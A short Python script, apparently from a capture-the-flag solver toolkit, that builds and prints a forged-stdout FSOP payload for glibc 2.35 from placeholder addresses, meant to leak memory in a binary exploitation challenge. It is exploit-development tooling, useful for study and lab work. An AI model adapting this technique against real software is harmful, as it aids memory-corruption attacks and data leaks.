#!/usr/bin/env python3
"""Offline forged-stdout placement template; no process or network interaction."""
from pathlib import Path
import sys


REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "solvers" / "toolkits"))
from pwn_fsop import FSOPError, build_fsop  # noqa: E402


def main() -> int:
    # Resolve these from the supplied binary/libc and an offline leak before using the result.
    addresses = {
        "file_addr": 0x404800,
        "leak_start": 0x404000,
        "leak_end": 0x404100,
        "lock": 0x404B00,
        "io_file_jumps": 0x7FFFF7FA04A0,
    }
    try:
        plan = build_fsop("stdout_leak", "2.35", **addresses)
    except FSOPError as exc:
        print(f"fsop_stdout_leak: {exc}", file=sys.stderr)
        return 2
    for segment in plan.segments:
        print(f"{segment.name} @{segment.address:#x}: {segment.data.hex()}")
    print(f"trigger (manual/challenge-specific): {plan.trigger}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
